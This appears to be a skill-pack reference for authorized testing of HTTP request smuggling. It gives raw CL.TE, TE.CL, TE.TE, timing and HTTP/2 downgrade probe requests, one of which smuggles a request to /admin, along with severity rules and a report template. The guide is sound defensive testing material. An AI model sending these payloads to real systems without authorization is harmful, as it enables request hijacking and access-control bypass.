# HTTP Request Smuggling Payload

> ⚠️ **Security Boundary Statement**
>
> This document is for **authorized AppSec assessment reference** only, helping identify HTTP request smuggling vulnerability risk characteristics.
>
> - All payloads are **technical principle demonstrations**, actual request hijacking is prohibited
> - Smuggling payloads are for understanding attack surface only, **no user session hijacking**
> - Validation proves vulnerability existence (timing difference/response anomaly), **no cache poisoning or credential theft**
> - See `SKILL.md` for specific execution boundaries
>
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PortSwigger, PayloadsAllTheThings

## Manual Testing

**Note: Test with safe, non-destructive payloads first**

---

## Validation Objectives (Within Security Boundary)

HTTP request smuggling validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| CL.TE Detection | ✓ Send conflicting Content-Length and Transfer-Encoding | - | Hijack user requests |
| TE.CL Detection | ✓ Reverse Content-Length/Transfer-Encoding order | - | Poison cache |
| TE.TE Detection | ✓ Obfuscated Transfer-Encoding variants | - | Access other users' data |
| Timing Detection | ✓ Measure response time differences | - | WAF bypass for exploitation |
| Response Anomaly | ✓ Observe smuggled request response | - | Session fixation |

**Safe Validation Method**: Send crafted requests with conflicting headers and observe timing or response differences; do not hijack actual user traffic.

---

## Detection Methods

### CL.TE Detection

```bash
# Content-Length takes precedence over Transfer-Encoding
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X

# If backend uses CL: waits for 6 bytes, sees "0\r\n\r\nX" (incomplete)
# If frontend uses TE: reads chunk "0" (end), passes "X" to next request
# Result: "X" becomes prefix of next request
```

### TE.CL Detection

```bash
# Transfer-Encoding takes precedence over Content-Length
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# If backend uses TE: reads chunk "8" + "SMUGGLED" + "0" (end)
# If frontend uses CL: reads 3 bytes, leaves "SMUGGLED" for next request
```

### TE.TE Detection

```bash
# Obfuscate Transfer-Encoding header
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: x

5
SMUGGLED
0

# Test various obfuscations:
# Transfer-Encoding: chunked
# Transfer-Encoding : chunked
# Transfer-Encoding: chunked, identity
# Transfer-encoding: chunked (case variation)
```

### Timing Detection

```bash
# Send request that should timeout if smuggling works
POST / HTTP/1.1
Host: target.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /nonexistent HTTP/1.1
Foo: x

# Measure time: if request hangs, smuggling confirmed
```

### H2.CL Detection (HTTP/2)

```bash
# HTTP/2 to HTTP/1 downgrade smuggling
# Send HTTP/2 request with both content-length and transfer-encoding

:method = POST
:path = /
:authority = target.com
content-length = 0

POST /admin HTTP/1.1
Host: target.com
Content-Length: 15

x=1
```

---

## Analysis Process

1. Identify frontend (reverse proxy/CDN) and backend server
2. Send CL.TE probe with safe payload
3. Send TE.CL probe with safe payload
4. Test TE.TE with obfuscated headers
5. Measure timing differences (≥2s indicates smuggling)
6. Check for response anomalies (unexpected status codes, paths)
7. **Stop validation**, document smuggling type
8. Do not attempt session hijacking or cache poisoning

---

## Severity Classification

Request smuggling severity depends on**whether architectural prerequisites hold**and**evidence confirmation level**. suspected smuggling has a high false-positive rate in real environments (network jitter/connection reuse/Keep-Alive behavior can all create false signals), must distinguish"confirmed"and"suspected". 

**Prerequisites** (if unmet, smuggling is not present; at most Info):
- target has separate frontend and backend layers (reverse proxy / CDN / load balancer + origin). direct single-layer service cannot be smuggled. 
- the two layers parse `Content-Length` / `Transfer-Encoding` differently. 

| Evidence type | DefaultSeverity | Note |
|---------|---------|------|
| prerequisite not met (single layer / no proxy) | Info | no smuggling possible; do not report vulnerability |
| Timing-only / indirect signal | Low | timing anomaly only, no direct evidence; false-positive prone, do not report High |
| TE.TE (ambiguous header difference) | Medium | depends on specific parser difference, limited impact |
| CL.TE / TE.CL confirmed (reproducible) | High | requires architectural prerequisite plus stable reproducible parser difference |
| H2.CL downgradeconfirmed | High | bypass HTTP/2 security boundary, requires confirmation that H2-to-H1 downgrade actually happens |

**Confirmation requirement**:High requires - 1)architectural prerequisite holds 2)stable reproducibility (not intermittent)3)direct response evidence exists (not pure timing inference). timing-only is always Low, do not escalate. many suspected CL.TE cases are connection-reuse artifacts, record Low and mark "needs further confirmation" before stable reproduction. 

---

## Output

```markdown
## Vulnerability: HTTP Request Smuggling

### Location
{URL} - Frontend: {proxy}, Backend: {server}

### Smuggling Type
{CL.TE / TE.CL / TE.TE / H2.CL}

### Evidence
- Probe: {conflicting headers sent}
- Response: {timing difference / anomaly observed}
- Frontend behavior: {which header it uses}
- Backend behavior: {which header it uses}

### Validation Result
- Smuggling confirmed: {yes/no}
- Type: {CL.TE / TE.CL / TE.TE}
- Impact potential: {request hijacking / cache poisoning / WAF bypass}

### Risk Level
{Based on evidence confirmation level + architectural prerequisites; timing-only always Low, CL.TE/TE.CL must be stably reproducible for High}
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Hijack user requests | Do not smuggle requests targeting real users |
| ❌ Poison cache | Do not inject responses into shared cache |
| ❌ Session fixation | Do not set cookies for other users |
| ❌ WAF bypass exploitation | Only confirm smuggling, do not exploit for other attacks |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Prove existence, do not enable harm"
- `templates/severity-classification.md` -> Smuggling severity rules
